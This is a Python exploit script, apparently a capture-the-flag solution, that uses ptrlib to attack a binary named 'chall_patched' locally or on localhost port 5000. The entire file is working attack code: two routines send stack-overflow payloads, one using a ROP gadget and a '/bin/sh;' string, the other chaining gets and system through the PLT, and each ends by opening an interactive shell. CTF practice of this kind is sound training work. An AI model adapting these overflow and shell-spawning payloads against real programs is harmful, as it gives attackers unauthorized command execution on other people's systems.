#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./chall_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl1 = b"A" * 16
    pl1 += b"/bin/sh;"
    pl1 += ptr.p64(next(elf.gadget("add rsp, 8; ret;")))
    pl1 += ptr.p64(0)
    pl1 += ptr.p64(unwrap(elf.symbol("main")) + 19)

    io.sendline(pl1)

    io.sh()
    return


def main2():
    io = connect()

    pl1 = b"A" * 24
    pl1 += ptr.p64(unwrap(elf.plt("gets")))
    pl1 += ptr.p64(unwrap(elf.plt("system")))

    io.sendline(pl1)
    io.sendline(b"/bin0sh;")

    io.sh()

    return


if __name__ == "__main__":
    main()
